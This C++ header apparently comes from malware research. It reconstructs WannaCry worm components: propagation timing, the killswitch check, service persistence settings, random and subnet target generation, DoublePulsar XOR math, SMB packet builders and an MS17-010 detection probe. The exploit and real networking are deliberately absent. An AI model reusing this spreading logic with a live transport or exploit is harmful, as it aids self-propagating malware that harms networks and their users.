/* ===========================================================================
 * worm_recon.h — mssecsvc_recon: MS17-010 lifecycle research build
 * ---------------------------------------------------------------------------
 * Pure, host-portable logic extracted from the validated reconstruction of
 * the WannaCry worm (mssecsvc.exe, MD5 db349b97c37d22f5ea1d1841e3c89eb4).
 *
 * RESEARCH HARNESS — NOT the malware:
 *  - The ransomware-payload linkage was EXCISED from this build entirely
 *    (resource "R" extraction, qeriuwjhrf rename, tasksche.exe launch: gone,
 *    not stubbed). The worm component exists here only as a study of the
 *    MS17-010 propagation lifecycle.
 *  - No exploit primitive: struct IExploitPrimitive is declared and never
 *    implemented. "Primitive intentionally absent; public research tooling
 *    exists." EternalBlue/DoublePulsar wire-byte arrays are NOT in this
 *    build tree (they live only in references/, cited by address).
 *  - All transport is behind ISmbTransport; the default transport is a
 *    print-and-fail stub. The only network-shaped code is the detection
 *    probe, which prints VULNERABLE / NOT VULNERABLE from response status
 *    bytes — the same check published in nmap smb-vuln-ms17-010 and
 *    Metasploit's ms17_010_command (public, defensive tooling).
 *
 * Address citations (0x40XXXX) refer to the original image base 0x400000.
 * =========================================================================== */
#ifndef WORM_RECON_H
#define WORM_RECON_H

#include <cstdio>
#include <cstring>
#include <cstdint>

namespace msr {

/* ------------------------------------------------------------------ *
 * 1. Lifecycle constants (all byte-verified in the binary)
 * ------------------------------------------------------------------ */
enum : uint32_t {
    SMB_PORT                = 445,       /* 0x1BD at 0x407596 etc.            */
    WORM_LIFETIME_MS        = 86400000,  /* ServiceMain Sleep(24h) @0x40801b  */
    RANDOM_THREADS          = 128,       /* start_spreader loop bound 0x80    */
    RANDOM_THREAD_SPAWN_MS  = 2000,      /* spawn pacing @0x407bfa            */
    SUBNET_CONCURRENCY_MAX  = 10,        /* subnet lane gate @0x407733        */
    ATTACK_ATTEMPTS         = 5,         /* exploit rounds @0x4075cf          */
    ATTACK_ROUND_DELAY_MS   = 3000,      /* 0xBB8                             */
    SWEEP_CANDIDATE_DELAY_MS= 50,        /* 0x32 /24-sweep pacing @0x4079e5   */
    RANDOM_ITER_DELAY_MS    = 100,       /* outer random-iter pacing @0x4079ff*/
    ATTACK_WATCHDOG_MS      = 600000,    /* 10-min subnet watchdog @0x4075b7  */
    SWEEP_WATCHDOG_MS       = 3600000,   /* 1-h sweep watchdog @0x407962      */
    REROLL_WINDOW_A_MS      = 2400000,   /* 0x249F00 first-octet re-roll      */
    REROLL_WINDOW_B_MS      = 1200000,   /* 0x124F80 second-octet re-roll     */
    FIRST_OCTET_MAX         = 224,       /* 0xE0 cap @0x4078dc                */
    FIRST_OCTET_SKIP        = 127,       /* loopback skip @0x4078d7           */
    RANDOM_OCTET_MOD        = 255,       /* div 0xFF (0..254) @0x4078ce       */
    OCTET_GEN_THREAD_LIMIT  = 32,        /* only idx < 0x20 re-roll a/b       */
    NBSS_HDR                = 4,
    SMB_HDR                 = 32,
};

/* ------------------------------------------------------------------ *
 * 2. Target + the intentionally-absent exploit primitive
 * ------------------------------------------------------------------ */
struct Target { char ip[64]; uint16_t port; };

/* primitive intentionally absent; public research tooling exists */
struct IExploitPrimitive { virtual int run(Target) = 0; };

/* ------------------------------------------------------------------ *
 * 3. Transport interface (sockets stay stubbed behind this guard)
 * ------------------------------------------------------------------ */
struct ISmbTransport {
    virtual bool connect(const char* ip, uint16_t port) = 0;
    virtual int  send(const uint8_t* buf, unsigned len) = 0;
    virtual int  recv(uint8_t* buf, unsigned cap) = 0;
    virtual void close() = 0;
    virtual ~ISmbTransport() {}
};

/* Default transport: print-and-fail. No socket is ever created in this
 * build. Replacing it is an exercise left to approved lab environments. */
struct StubTransport : ISmbTransport {
    bool connect(const char* ip, uint16_t port) {
        std::printf("[stub-transport: connect(%s:%u) -> fail]\n",
                    ip, (unsigned)port);
        return false;
    }
    int  send(const uint8_t*, unsigned len) {
        std::printf("[stub-transport: send(%u) -> fail]\n", len); return -1;
    }
    int  recv(uint8_t*, unsigned) {
        std::printf("[stub-transport: recv -> fail]\n"); return -1;
    }
    void close() { std::printf("[stub-transport: close]\n"); }
};

/* ------------------------------------------------------------------ *
 * 4. Killswitch (0x408140) — string handling + inverted decision logic.
 *    A live HTTP answer parks the worm; an unanswerable domain proceeds.
 * ------------------------------------------------------------------ */
inline const char* killswitch_url(void) {
    return "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"; /* 0x4313d0 */
}
inline bool killswitch_url_copy(char* dst, size_t cap) {
    const char* u = killswitch_url();      /* 56 chars + NUL = 57-B copy    */
    if (cap < 57) return false;
    std::memcpy(dst, u, 57);               /* 0xE dwords + 1 byte @0x408160 */
    return true;
}
enum KillDecision { KD_DORMANT = 0, KD_PROCEED = 1 };
inline KillDecision killswitch_decide(bool url_answered) {
    return url_answered ? KD_DORMANT : KD_PROCEED;      /* inverted by design */
}

/* ------------------------------------------------------------------ *
 * 5. Service-config structs (0x408000/0x407f30/0x407fa0) — data only.
 *    No SCM calls exist in this build.
 * ------------------------------------------------------------------ */
struct SvcStatus {                       /* layout @0x431430 */
    uint32_t type;        /* SERVICE_WIN32_OWN_PROCESS = 0x20                */
    uint32_t state;       /* 2 START_PENDING -> 4 RUNNING -> 1 STOPPED       */
    uint32_t controls;    /* ACCEPT_STOP = 1                                 */
    uint32_t win32_exit;
    uint32_t svc_exit;
    uint32_t checkpoint;
    uint32_t wait_hint;
};
inline SvcStatus service_status_running(void) {
    SvcStatus s = { 0x20, 4, 1, 0, 0, 0, 0 }; return s;
}
inline SvcStatus service_status_stopped(void) {  /* handler ctl 1/5 @0x407f30 */
    SvcStatus s = { 0x20, 1, 1, 0, 0, 0, 0 }; return s;
}
struct ScAction { uint32_t type; uint32_t delay_ms; };   /* RESTART = 1 */
struct FailureActions {                  /* SERVICE_CONFIG_FAILURE_ACTIONS    */
    uint32_t  reset_period;              /* 1 (in-binary)                     */
    const char* reboot_msg;              /* -> "" @0x70f87c                   */
    const char* command;                 /* -> ""                             */
    uint32_t  n_actions;                 /* 1                                 */
    ScAction  actions[1];                /* delay = arg*1000, called w/ 60 s  */
};
inline FailureActions failure_actions_restart_after(unsigned seconds) {
    FailureActions f;
    f.reset_period = 1;
    f.reboot_msg   = "";
    f.command      = "";
    f.n_actions    = 1;
    f.actions[0].type    = (seconds != (unsigned)-1) ? 1u : 0u;
    f.actions[0].delay_ms= seconds * 1000u;      /* 60 s in the live call    */
    return f;
}
inline bool build_service_binpath(char* out, size_t cap, const char* exe) {
    /* "%s -m security" (0x431330) — the SCM argument vector of the worm   */
    int n = std::snprintf(out, cap, "%s -m security", exe);
    return n > 0 && (size_t)n < cap;
}

/* ------------------------------------------------------------------ *
 * 6. IPv4 helpers + RFC1918 filter (0x409110) + /24 split (0x408e50)
 * ------------------------------------------------------------------ */
inline uint32_t parse_ipv4(const char* s) {
    /* returns the uint32 whose value equals the big-endian byte reading
     * (10.1.2.3 -> 0x0A010203) — the same domain the in-binary htonl
     * compares (0x409110) and byte-step split (0x408e50) operate in.     */
    unsigned a=0,b=0,c=0,d=0; char extra=0;
    if (std::sscanf(s, "%u.%u.%u.%u%c", &a,&b,&c,&d,&extra) != 4) return 0;
    if (a>255||b>255||c>255||d>255) return 0;
    return (a<<24)|(b<<16)|(c<<8)|d;
}

/* exact in-binary bounds (htonl space), exclusive */
inline bool is_rfc1918(uint32_t ip_be) {
    if (ip_be > 0x09ffffffu && ip_be < 0x0b000000u) return true; /* 10/8       */
    if (ip_be > 0xac0fffffu && ip_be < 0xac200000u) return true; /* 172.16/12  */
    if (ip_be > 0xc0a7ffffu && ip_be < 0xc0a90000u) return true; /* 192.168/16 */
    return false;
}

/* 0x408e50: byte-step [net, wild]; skip .0 and .255 hosts; emit unique
 * /24 bases (the in-binary per-host emission is deduped downstream by the
 * unique() pass at 0x4092xx — dedup folded in here). Returns count. */
inline int split_into_24s(uint32_t net, uint32_t wild,
                          uint32_t* out, int cap)
{
    int n = 0;
    for (uint32_t a = net; a <= wild && n < cap; ++a) {
        if ((a & 0xffu) == 0 || (a & 0xffu) == 0xffu) continue;
        uint32_t base = a & 0xffffff00u;
        bool seen = false;
        for (int i = 0; i < n; ++i) if (out[i] == base) { seen = true; break; }
        if (!seen) out[n++] = base;
    }
    return n;
}

/* Gateway/DNS-server sweep (0x409160 second walk + GetPerAdapterInfo pass):
 * subnet /24s + gateway /24 + RFC1918-filtered DNS /24s, deduped. */
struct AdapterRecord {
    const char* ip;              /* adapter address          */
    const char* mask;            /* adapter netmask          */
    const char* gateway;         /* GatewayList (+0x1D4)     */
    const char* dns[4];          /* DnsServerList (info+0xC) */
};
inline bool push_unique(uint32_t* v, int* n, int cap, uint32_t x24) {
    for (int i = 0; i < *n; ++i) if (v[i] == x24) return true;
    if (*n >= cap) return false;
    v[(*n)++] = x24; return true;
}
inline int collect_adapter_targets(const AdapterRecord& rec,
                                   uint32_t* out, int cap)
{
    int n = 0;
    uint32_t ip = parse_ipv4(rec.ip), m = parse_ipv4(rec.mask);
    if (ip && m) {
        uint32_t net = ip & m, wild = ip | ~m;
        uint32_t tmp[256];
        int k = split_into_24s(net, wild, tmp, 256);
        for (int i = 0; i < k; ++i) push_unique(out, &n, cap, tmp[i]);
    }
    if (rec.gateway) {
        uint32_t g = parse_ipv4(rec.gateway);
        if (g) push_unique(out, &n, cap, g & 0xffffff00u);
    }
    for (int i = 0; i < 4; ++i) {
        if (!rec.dns[i]) break;
        uint32_t d = parse_ipv4(rec.dns[i]);
        if (d && is_rfc1918(d)) push_unique(out, &n, cap, d & 0xffffff00u);
    }
    return n;
}

/* ------------------------------------------------------------------ *
 * 7. Random-IP generator (0x407840) — pure state machine, injectable RNG.
 *    rng() draws are consumed exactly as in-binary: a,b,c,d each mod 255.
 * ------------------------------------------------------------------ */
struct IpGen {
    uint32_t (*rng)(void* ctx);
    void*     ctx;
    int       idx;                /* thread index arg (0..127)              */
    uint32_t  t0;                 /* window base, reset after a /24 sweep   */
    uint32_t  a, b;               /* sticky octets                          */
    bool      roll_a, roll_b;     /* start armed; cleared after a sweep     */

    void init(uint32_t (*rngfn)(void*), void* c, int thread_idx, uint32_t now) {
        rng = rngfn; ctx = c; idx = thread_idx; t0 = now;
        a = b = 0; roll_a = roll_b = true;
    }
    void tick(uint32_t now) {                       /* loop-top @0x407897    */
        if (now - t0 > REROLL_WINDOW_A_MS) roll_a = true;   /* 40 min        */
        if (now - t0 > REROLL_WINDOW_B_MS) roll_b = true;   /* 20 min        */
    }
    /* Emits one "a.b.c.d" candidate. Returns false only on invariant
     * failure (cannot draw a usable first octet in 256 attempts — the
     * in-binary code instead loops forever at the iteration top). */
    bool next(uint32_t now, char out[16]) {
        for (int attempt = 0; attempt < 256; ++attempt) {
            tick(now);
            if (roll_a && idx < (int)OCTET_GEN_THREAD_LIMIT) {   /* 0x4078c7 */
                a = (uint32_t)rng(ctx) % RANDOM_OCTET_MOD;
                if (a == FIRST_OCTET_SKIP || a >= FIRST_OCTET_MAX) continue;
            }
            if (roll_b && idx < (int)OCTET_GEN_THREAD_LIMIT) {   /* 0x4078e4 */
                b = (uint32_t)rng(ctx) % RANDOM_OCTET_MOD;
            }
            uint32_t c = (uint32_t)rng(ctx) % RANDOM_OCTET_MOD;  /* fresh   */
            uint32_t d = (uint32_t)rng(ctx) % RANDOM_OCTET_MOD;
            int pr = std::snprintf(out, 16, "%u.%u.%u.%u", (unsigned)a,
                                   (unsigned)b, (unsigned)c, (unsigned)d);
            if (pr < 0 || pr >= 16) return false;
            return true;
        }
        return false;
    }
    void sweep_done(uint32_t now) {                  /* hit branch @0x407943  */
        roll_a = roll_b = false;
        t0 = now;
    }
};

/* ------------------------------------------------------------------ *
 * 8. DoublePulsar key math (0x406ed0 / 0x406f00) — in-memory buffers only
 * ------------------------------------------------------------------ */
inline uint32_t dp_key_transform(uint32_t x) {       /* bswap(x) ^ 2x      */
    return ((x >> 24) | ((x >> 8) & 0xff00u) | ((x << 8) & 0xff0000u) |
            (x << 24)) ^ (x * 2u);
}
inline void xor_decode(uint32_t key, uint8_t* data, int len) {  /* key[i%4] */
    uint8_t kb[4];
    kb[0] = (uint8_t)(key);        kb[1] = (uint8_t)(key >> 8);
    kb[2] = (uint8_t)(key >> 16);  kb[3] = (uint8_t)(key >> 24);
    for (int i = 0; i < len; ++i) data[i] ^= kb[i & 3];
}

/* ------------------------------------------------------------------ *
 * 9. SMB marker patching (0x401190/0x4017b0) — pure string logic
 * ------------------------------------------------------------------ */
inline int find_marker(const char* buf, int limit, const char* marker) {
    int m = (int)std::strlen(marker);
    for (int i = 0; i + m <= limit; ++i)
        if (std::memcmp(buf + i, marker, (size_t)m) == 0) return i;
    return -1;
}
/* Splice 2-byte UID/TID and the path over their markers (0x401190 logic:
 * each hit compacts the packet — marker bytes removed, value inserted);
 * returns the new length, or -1 when nothing was patched. */
inline int patch_smb_markers(uint8_t* pkt, int len,
                             const uint8_t uid[2], const uint8_t tid[2],
                             const char* path)
{
    static const char UID[] = "__USERID__PLACEHOLDER__";
    static const char TID[] = "__TREEID__PLACEHOLDER__";
    static const char PTH[] = "__TREEPATH_REPLACE__";
    int wrote = 0;

    int off = find_marker((const char*)pkt, len, UID);
    if (off >= 0) {
        int mlen = (int)sizeof(UID) - 1;
        std::memmove(pkt + off + 2, pkt + off + mlen,
                     (size_t)(len - off - mlen));
        pkt[off] = uid[0]; pkt[off + 1] = uid[1];
        len += 2 - mlen; ++wrote;
    }
    off = find_marker((const char*)pkt, len, TID);
    if (off >= 0) {
        int mlen = (int)sizeof(TID) - 1;
        std::memmove(pkt + off + 2, pkt + off + mlen,
                     (size_t)(len - off - mlen));
        pkt[off] = tid[0]; pkt[off + 1] = tid[1];
        len += 2 - mlen; ++wrote;
    }
    off = find_marker((const char*)pkt, len, PTH);
    if (off >= 0) {
        int mlen = (int)sizeof(PTH) - 1;
        int plen = (int)std::strlen(path);
        std::memmove(pkt + off + plen, pkt + off + mlen,
                     (size_t)(len - off - mlen));
        std::memcpy(pkt + off, path, (size_t)plen);
        len += plen - mlen; ++wrote;
    }
    return wrote ? len : -1;
}

/* ------------------------------------------------------------------ *
 * 10. SMB protocol crafters (public packet shapes — identical to the
 *     packets published in bhassani's reconstruction and Metasploit).
 * ------------------------------------------------------------------ */
struct SmbHeader {                        /* wire layout, offsets 0..31      */
    uint8_t  proto[4];                    /* ff 'S' 'M' 'B'                  */
    uint8_t  command;
    uint32_t status;                      /* @+5 — the detection oracle      */
    uint8_t  flags;
    uint16_t flags2;
    uint16_t pid_high;
    uint8_t  sig[8];
    uint16_t reserved;
    uint16_t tid, pid, uid, mid;
};
inline void nbss_header(uint8_t* out, uint32_t smb_len) {   /* type 0x00    */
    out[0] = 0;
    out[1] = (uint8_t)(smb_len >> 16);
    out[2] = (uint8_t)(smb_len >> 8);
    out[3] = (uint8_t)(smb_len);
}
inline void smb_header(uint8_t out[32], uint8_t cmd, uint32_t status,
                       uint16_t tid, uint16_t uid, uint16_t mid)
{
    out[0]=0xff; out[1]='S'; out[2]='M'; out[3]='B';
    out[4] = cmd;
    out[5] = (uint8_t)status;        out[6] = (uint8_t)(status >> 8);
    out[7] = (uint8_t)(status >> 16);out[8] = (uint8_t)(status >> 24);
    out[9]  = 0x18;                  /* flags: canonicalized paths off      */
    out[10] = 0x53; out[11] = 0x06;  /* flags2: LONG_NAMES|NT_STATUS|LONGER */
    out[12] = 0x00; out[13] = 0x00;  /* pid high                            */
    for (int i = 14; i < 22; ++i) out[i] = 0;      /* signature              */
    out[22] = 0; out[23] = 0;                      /* reserved               */
    out[24] = (uint8_t)tid;  out[25] = (uint8_t)(tid >> 8);
    out[26] = (uint8_t)0xfe; out[27] = (uint8_t)0xff;   /* pid 0xfffe        */
    out[28] = (uint8_t)uid;  out[29] = (uint8_t)(uid >> 8);
    out[30] = (uint8_t)mid;  out[31] = (uint8_t)(mid >> 8);
}
/* Negotiate (0x72): public dialect list, same strings as the original
 * packet (byte-verified at 0x42e3d0) and every public SMB1 tool. */
inline int build_negotiate(uint8_t* out, unsigned cap) {
    static const char* dial[] = { "LANMAN1.0", "LM1.2X002", "NT LM 0.12" };
    uint8_t body[128]; int n = 0;
    body[n++] = 0;                                    /* WordCount          */
    int bc_at = n; n += 2;                            /* ByteCount slot     */
    for (int i = 0; i < 3; ++i) {
        body[n++] = 0x02;                             /* DIALECT token      */
        int l = (int)std::strlen(dial[i]);
        std::memcpy(body + n, dial[i], (size_t)l); n += l;
        body[n++] = 0;
    }
    body[bc_at] = (uint8_t)(n - bc_at - 2);
    body[bc_at+1] = 0;
    if ((unsigned)n + NBSS_HDR + SMB_HDR > cap) return -1;
    smb_header(out + NBSS_HDR, 0x72, 0, 0, 0, 0x71);
    std::memcpy(out + NBSS_HDR + SMB_HDR, body, (unsigned)n);
    nbss_header(out, (uint32_t)(SMB_HDR + n));
    return NBSS_HDR + SMB_HDR + n;
}
/* Session Setup AndX (0x73), anonymous — public 13-WCT shape. */
inline int build_session_setup_andx(uint8_t* out, unsigned cap) {
    uint8_t body[64]; int n = 0;
    body[n++] = 13;                                   /* WordCount          */
    body[n++] = 0xff; body[n++] = 0x00;               /* AndXCommand NONE   */
    body[n++] = 0x00; body[n++] = 0x00;               /* reserved           */
    body[n++] = 0x00; body[n++] = 0x00;               /* AndXOffset         */
    body[n++] = 0x04; body[n++] = 0xff;               /* MaxBuffer          */
    body[n++] = 0x04; body[n++] = 0xff;               /* MaxMpxCount        */
    body[n++] = 0x00; body[n++] = 0x01;               /* VC number          */
    body[n++] = 0x00; body[n++] = 0x00; body[n++] = 0x00; body[n++] = 0x00;
    body[n++] = 0x64; body[n++] = 0x00;               /* key = 100          */
    body[n++] = 0x00; body[n++] = 0x00; body[n++] = 0x00; body[n++] = 0x00;
    body[n++] = 0x00; body[n++] = 0x00;               /* name len = 0       */
    body[n++] = 0x01; body[n++] = 0x00;               /* capabilities       */
    int bc_at = n; n += 2;
    body[n++] = 0x00;                                 /* empty account      */
    body[n++] = 0x00;                                 /* empty primary dom  */
    body[n++] = 0x00;                                 /* native OS          */
    body[n++] = 0x00;                                 /* native LANMAN      */
    body[bc_at] = (uint8_t)(n - bc_at - 2);
    body[bc_at+1] = 0;
    if ((unsigned)n + NBSS_HDR + SMB_HDR > cap) return -1;
    smb_header(out + NBSS_HDR, 0x73, 0, 0, 0, 0x72);
    std::memcpy(out + NBSS_HDR + SMB_HDR, body, (unsigned)n);
    nbss_header(out, (uint32_t)(SMB_HDR + n));
    return NBSS_HDR + SMB_HDR + n;
}
/* Tree Connect AndX (0x75) to \\IP\IPC$ via marker placeholders spliced by
 * the pure patcher (0x4017b0 logic) — service "IPC", public packet shape.
 * The UID/TID markers compact away (20/19 bytes each), so the ByteCount is
 * fixed up after the splice; TID also rides the SMB header word. */
inline int build_tree_connect_andx(uint8_t* out, unsigned cap,
                                   const char* ip, uint16_t uid, uint16_t tid)
{
    uint8_t body[160]; int n = 0;
    char path[40];
    body[n++] = 4;                                    /* WordCount          */
    body[n++] = 0xff; body[n++] = 0x00;               /* AndXCommand NONE   */
    body[n++] = 0x00; body[n++] = 0x00;               /* reserved           */
    body[n++] = 0x00; body[n++] = 0x00;               /* AndXOffset         */
    body[n++] = 0x08; body[n++] = 0x00;               /* flags              */
    int bc_at = n; n += 2;                            /* ByteCount slot     */
    std::memcpy(body + n, "__USERID__PLACEHOLDER__", 23); n += 23;  /* full marker: the 0x401190 patcher matches all 23 chars and splices the 2-byte UID in place */
    int pr = std::snprintf(path, sizeof(path), "\\\\%s\\IPC$", ip);
    if (pr < 0 || (unsigned)pr >= sizeof(path)) return -1;
    std::memcpy(body + n, "__TREEPATH_REPLACE__", 20); n += 20;
    body[n++] = 'I'; body[n++] = 'P'; body[n++] = 'C'; body[n++] = 0;
    body[n++] = '?'; body[n++] = '?'; body[n++] = 0;
    uint8_t u[2] = { (uint8_t)uid, (uint8_t)(uid >> 8) };
    uint8_t t[2] = { (uint8_t)tid, (uint8_t)(tid >> 8) };
    int nl = patch_smb_markers(body, n, u, t, path);
    if (nl < 0) return -1;
    n = nl;
    body[bc_at] = (uint8_t)(n - bc_at - 2);           /* post-splice count  */
    body[bc_at + 1] = 0;
    if ((unsigned)n + NBSS_HDR + SMB_HDR > cap) return -1;
    smb_header(out + NBSS_HDR, 0x75, 0, tid, uid, 0x73);
    std::memcpy(out + NBSS_HDR + SMB_HDR, body, (unsigned)n);
    nbss_header(out, (uint32_t)(SMB_HDR + n));
    return NBSS_HDR + SMB_HDR + n;
}
/* Trans2 probe (0x32 / subcommand 0x0C) with a bogus UID — the detection
 * request. Unpatched SMBv1 answers 0xC0000205 (the 05 02 00 C0 bytes at
 * 0x401b1f-0x401b3a in-binary); patched stacks refuse earlier. */
inline int build_trans2_probe(uint8_t* out, unsigned cap, uint16_t uid,
                              uint16_t tid)
{
    uint8_t body[80]; int n = 0;
    body[n++] = 15;                                   /* WordCount          */
    body[n++] = 0x0c; body[n++] = 0x00;               /* subcommand 0x0C    */
    body[n++] = 0x00; body[n++] = 0x00;               /* reserved           */
    body[n++] = 0x00; body[n++] = 0x00;               /* params offset      */
    body[n++] = 0x00; body[n++] = 0x00;               /* params count       */
    body[n++] = 0x00; body[n++] = 0x00;               /* data count         */
    body[n++] = 0x00; body[n++] = 0x00;               /* max params         */
    body[n++] = 0x00; body[n++] = 0x00;               /* max data           */
    body[n++] = 0x00; body[n++] = 0x00;               /* max setup          */
    body[n++] = 0x00;                                 /* reserved           */
    body[n++] = 0x00;                                 /* flags              */
    body[n++] = 0x00; body[n++] = 0x00;               /* timeout            */
    body[n++] = 0x00; body[n++] = 0x00;               /* reserved           */
    int bc_at = n; n += 2;                            /* ByteCount = 0      */
    body[bc_at] = 0; body[bc_at+1] = 0;
    if ((unsigned)n + NBSS_HDR + SMB_HDR > cap) return -1;
    smb_header(out + NBSS_HDR, 0x32, 0, tid, uid, 0x74);
    std::memcpy(out + NBSS_HDR + SMB_HDR, body, (unsigned)n);
    nbss_header(out, (uint32_t)(SMB_HDR + n));
    return NBSS_HDR + SMB_HDR + n;
}
inline uint32_t smb_response_status(const uint8_t* resp, int n) {
    if (n < (int)(NBSS_HDR + SMB_HDR)) return 0xffffffffu;
    const uint8_t* s = resp + NBSS_HDR;               /* skip NBSS          */
    if (s[0] != 0xff || s[1] != 'S' || s[2] != 'M' || s[3] != 'B')
        return 0xffffffffu;
    return (uint32_t)s[5] | ((uint32_t)s[6] << 8) |
           ((uint32_t)s[7] << 16) | ((uint32_t)s[8] << 24);
}
inline uint16_t smb_response_field(const uint8_t* resp, int n, int off16) {
    if (n < (int)(NBSS_HDR + SMB_HDR)) return 0;
    const uint8_t* s = resp + NBSS_HDR;
    return (uint16_t)(s[off16] | (s[off16 + 1] << 8));
}

/* ------------------------------------------------------------------ *
 * 11. MS17-010 probe / fingerprint (DETECTION ONLY)
 * ------------------------------------------------------------------ */
enum ProbeVerdict {
    PV_NO_TRANSPORT = 0,     /* transport could not connect            */
    PV_NO_RESPONSE  = 1,     /* connected but no/short reply           */
    PV_NOT_VULNERABLE = 2,
    PV_VULNERABLE   = 3,     /* STATUS_INSUFF_SERVER_RESOURCES 0xC0000205 */
};
inline const char* probe_verdict_str(ProbeVerdict v) {
    switch (v) {
    case PV_VULNERABLE:     return "VULNERABLE";
    case PV_NOT_VULNERABLE: return "NOT VULNERABLE";
    case PV_NO_RESPONSE:    return "NO RESPONSE";
    default:                return "NO TRANSPORT";
    }
}
inline ProbeVerdict ms17_010_probe(ISmbTransport& t, const Target& tgt)
{
    uint8_t  out[256], resp[512];
    int      n;
    uint16_t uid = 0, tid = 0;
    uint32_t status;

    if (!t.connect(tgt.ip, tgt.port)) return PV_NO_TRANSPORT;

    n = build_negotiate(out, sizeof(out));
    if (n < 0 || t.send(out, (unsigned)n) < 0) { t.close(); return PV_NO_RESPONSE; }
    n = t.recv(resp, sizeof(resp));
    if (n < (int)(NBSS_HDR + SMB_HDR)) { t.close(); return PV_NO_RESPONSE; }

    n = build_session_setup_andx(out, sizeof(out));
    if (n < 0 || t.send(out, (unsigned)n) < 0) { t.close(); return PV_NO_RESPONSE; }
    n = t.recv(resp, sizeof(resp));
    if (n < (int)(NBSS_HDR + SMB_HDR)) { t.close(); return PV_NO_RESPONSE; }
    uid = smb_response_field(resp, n, 28);            /* UID @SMB+28        */
    tid = smb_response_field(resp, n, 26);            /* TID @SMB+26        */

    n = build_tree_connect_andx(out, sizeof(out), tgt.ip, uid, tid);
    if (n < 0 || t.send(out, (unsigned)n) < 0) { t.close(); return PV_NO_RESPONSE; }
    n = t.recv(resp, sizeof(resp));
    if (n < (int)(NBSS_HDR + SMB_HDR)) { t.close(); return PV_NO_RESPONSE; }
    tid = smb_response_field(resp, n, 26);

    n = build_trans2_probe(out, sizeof(out), (uint16_t)(uid ^ 0xff01u), tid);
    if (n < 0 || t.send(out, (unsigned)n) < 0) { t.close(); return PV_NO_RESPONSE; }
    n = t.recv(resp, sizeof(resp));
    t.close();
    if (n < (int)(NBSS_HDR + SMB_HDR)) return PV_NO_RESPONSE;

    status = smb_response_status(resp, n);
    return (status == 0xc0000205u) ? PV_VULNERABLE : PV_NOT_VULNERABLE;
}

} /* namespace msr */
#endif /* WORM_RECON_H */
